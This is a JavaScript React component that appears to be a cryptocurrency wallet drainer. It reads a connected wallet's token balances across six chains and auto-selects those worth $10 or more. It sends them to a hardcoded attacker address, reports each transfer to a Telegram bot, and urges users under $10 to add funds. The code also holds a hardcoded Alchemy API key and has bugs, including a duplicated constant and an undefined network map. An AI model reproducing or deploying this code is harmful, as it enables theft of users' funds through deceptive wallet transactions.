import { useCallback, useEffect, useState } from 'react';
import { useAccount, usePublicClient, useWalletClient, useNetwork } from 'wagmi';
import { Loading, Toggle, Modal, Button } from '@geist-ui/core';
import { tinyBig } from 'essential-eth';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { Alchemy, Network } from 'alchemy-sdk';
import Dexie from 'dexie';

// Initialize Dexie database
const db = new Dexie('TokenDatabase');
db.version(1).stores({
  tokens: 'contract_address, balance, quote, quote_rate',
  checkedRecords: 'contract_address, isChecked',
});

// Alchemy instances for multiple networks
const alchemyInstances = {
  [Network.ETH_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ETH_MAINNET }),
  [Network.BSC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.BSC_MAINNET }),
  [Network.OPTIMISM]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.OPTIMISM }),
  [Network.ZK_SYNC]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ZK_SYNC }),
  [Network.ARB_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ARB_MAINNET }),
  [Network.MATIC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.MATIC_MAINNET }),
  // Add other networks as needed
};

// Mapping of chain IDs to destination addresses
const chainIdToDestinationAddress = {
  1: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
};

// Supported chain IDs
const supportedChains = [1, 56, 10, 324, 42161, 137];

// Mapping of chain IDs to destination addresses
const chainIdToDestinationAddress = {
  1: '0x...MainnetAddress',
  56: '0x...BSCAddress',
  10: '0x...OptimismAddress',
  324: '0x...ZkSyncAddress',
  42161: '0x...ArbitrumAddress',
  137: '0x...PolygonAddress',
};

// Telegram bot configuration
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';

// USD formatter for currency formatting
const usdFormatter = new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
});

// Function to safely convert input values to tinyBig numbers
const safeNumber = (value) => {
  try {
    if (value === undefined || value === null || value === '') {
      return tinyBig(0);
    }
    const num = tinyBig(value.toString());
    return num.isNaN() ? tinyBig(0) : num;
  } catch (error) {
    console.error('Invalid number detected:', error, value);
    return tinyBig(0);
  }
};

// Function to send a Telegram notification
const sendTelegramNotification = async ({ senderAddress, amount, chainId, chainName, blockExplorerUrl }) => {
  const message = `Transaction Details:
- Sender Address: ${senderAddress}
- Amount: ${amount} ETH
- Chain ID: ${chainId}
- Chain Name: ${chainName}
- Block Explorer: ${blockExplorerUrl}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const params = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(params),
    });

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.statusText}`);
    }
    console.log('Telegram notification sent successfully.');
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
};

const TokenRow = ({ token }) => {
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { chain } = useAccount();
  const pendingTxn = checkedRecords[token.contract_address]?.pendingTxn;

  const setTokenChecked = async (tokenAddress, isChecked) => {
    setCheckedRecords((old) => ({
      ...old,
      [tokenAddress]: { isChecked: isChecked },
    }));
    await db.checkedRecords.put({ contract_address: tokenAddress, isChecked });
  };

  const { address } = useAccount();
  const { balance, contract_address, contract_ticker_symbol, quote, quote_rate } = token;

  const unroundedBalance = safeNumber(quote_rate).gt(0)
    ? safeNumber(quote).div(safeNumber(quote_rate))
    : safeNumber(0);

  const roundedBalance = unroundedBalance.lt(0.001)
    ? unroundedBalance.round(10)
    : unroundedBalance.gt(1000)
    ? unroundedBalance.round(2)
    : unroundedBalance.round(5);

  return (
    <div key={contract_address} style={{ display: 'flex', alignItems: 'center', marginBottom: '8px' }}>
      <Toggle
        checked={checkedRecords[contract_address]?.isChecked}
        onChange={(e) => {
          setTokenChecked(contract_address, e.target.checked);
        }}
        style={{ marginRight: '18px' }}
        disabled={Boolean(pendingTxn)}
      />
      <span style={{ fontFamily: 'monospace', marginRight: '8px' }}>
        {roundedBalance.toString()} {contract_ticker_symbol}
      </span>
      <span style={{ marginRight: '8px' }}>(worth {usdFormatter.format(safeNumber(quote))})</span>
      <a
        href={`${chain?.blockExplorers?.default.url}/token/${token.contract_address}?a=${address}`}
        target="_blank"
        rel="noreferrer"
        style={{ textDecoration: 'underline', color: '#0070f3' }}
      >
        View on Explorer
      </a>
    </div>
  );
};

const handleTokenTransaction = async (walletClient, destinationAddress, amount, nextChainId, switchNetwork) => {
  if (!walletClient.data || !destinationAddress) return;

  try {
    const tx = await walletClient.data.sendTransaction({
      to: destinationAddress,
      value: amount,
      gasLimit: '21000', // Example gas limit
    });

    console.log('Transaction sent:', tx.hash);

    // Immediately switch to the next network after the transaction is sent
    if (nextChainId) {
      switchNetwork(nextChainId);
    }

    // Get the block explorer URL and chain info
    const chainName = walletClient.chain.name;
    const chainId = walletClient.chain.id;
    const blockExplorerUrl = `${walletClient.chain.blockExplorers?.default.url}/tx/${tx.hash}`;

    // Send Telegram notification
    sendTelegramNotification({
      senderAddress: walletClient.data.address,
      amount: amount,
      chainId: chainId,
      chainName: chainName,
      blockExplorerUrl: blockExplorerUrl,
    });

  } catch (error) {
    console.error('Failed to send transaction:', error);
  }
};

export const GetTokens = () => {
  const [tokens, setTokens] = useAtom(globalTokensAtom);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { address, isConnected, chain } = useAccount();
  const walletClient = useWalletClient();
  const { chains, switchNetwork } = useNetwork(); // Import useNetwork for switching networks
  const [isModalVisible, setIsModalVisible] = useState(false);
  const [nextNetwork, setNextNetwork] = useState(null);
  const [showMinBalanceMessage, setShowMinBalanceMessage] = useState(false); // New state for minimum balance message

  const fetchData = useCallback(async () => {
    setLoading(true);
    try {
      setError('');
      if (!chain || !supportedChains.includes(chain.id)) {
        throw new Error(`Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(', ')}.`);
      }

      const alchemyNetwork = chainIdToNetworkMap[chain.id];
      if (!alchemyNetwork) {
        throw new Error('Unsupported network');
      }

      const alchemy = alchemyInstances[alchemyNetwork];
      const response = await alchemy.core.getTokenBalances(address);

      if (response?.tokenBalances) {
        const processedTokens = await Promise.all(
          response.tokenBalances.map(async (balanceData) => {
            const tokenAddress = balanceData.contractAddress;
            const tokenBalance = balanceData.tokenBalance;
            const tokenMetadata = await alchemy.core.getTokenMetadata(tokenAddress);

            return {
              contract_address: tokenAddress,
              balance: tokenBalance,
              contract_ticker_symbol: tokenMetadata.symbol,
              quote: safeNumber(tokenBalance).mul(safeNumber(tokenMetadata.decimals)),
              quote_rate: safeNumber(tokenMetadata.decimals),
              isChecked: false,
            };
          })
        );
        setTokens(processedTokens);
        await db.tokens.bulkPut(processedTokens);

        // Automatically check tokens with balance worth more than $10
        const checkedRecordsFromDB = {};
        processedTokens.forEach(async (token) => {
          const { contract_address, quote } = token;
          const isChecked = safeNumber(quote).gte(10);
          checkedRecordsFromDB[contract_address] = { isChecked };
          await db.checkedRecords.put({ contract_address, isChecked });
        });
        setCheckedRecords(checkedRecordsFromDB);

        // Show message if no tokens with balance worth more than $10
        const hasEligibleTokens = processedTokens.some(token => safeNumber(token.quote).gte(10));
        setShowMinBalanceMessage(!hasEligibleTokens);
      }
    } catch (err) {
      console.error(err);
      setError(err.message || 'Error fetching token balances');
    } finally {
      setLoading(false);
    }
  }, [address, chain, setTokens, setCheckedRecords]);

  useEffect(() => {
    if (isConnected) {
      fetchData();
    }
  }, [isConnected, fetchData]);

  const handleSendAllTransactions = async () => {
    const checkedTokens = Object.entries(checkedRecords).filter(([_, record]) => record.isChecked);

    if (checkedTokens.length === 0) {
      console.log('No tokens selected for transaction.');
      return;
    }

    const sendTransactions = async (index = 0) => {
      if (index >= checkedTokens.length) {
        console.log('All transactions sent.');
        return;
      }

      const [contractAddress, _] = checkedTokens[index];
      const token = tokens.find(t => t.contract_address === contractAddress);

      if (!token) return;

      const nextChainId = index + 1 < checkedTokens.length
        ? chain.id
        : null;

      const destinationAddress = chainIdToDestinationAddress[chain.id];
      const amount = safeNumber(token.balance).mul(safeNumber(token.quote_rate));

      await handleTokenTransaction(walletClient, destinationAddress, amount, nextChainId, switchNetwork);

      // Move to the next transaction after a short delay
      setTimeout(() => sendTransactions(index + 1), 1000);
    };

    // Start sending transactions
    sendTransactions();
  };

  if (loading) return <Loading>Fetching your tokens...</Loading>;

  if (error) return <div>Error: {error}</div>;

  return (
    <>
      {showMinBalanceMessage && (
        <div>
          <p>Your balance in all networks is below $10. Please add funds to proceed.</p>
        </div>
      )}
      <div>
        {tokens.map(token => (
          <TokenRow key={token.contract_address} token={token} />
        ))}
      </div>
      <Button onClick={handleSendAllTransactions} disabled={loading || showMinBalanceMessage}>
        Send All Checked Tokens
      </Button>
    </>
  );
};
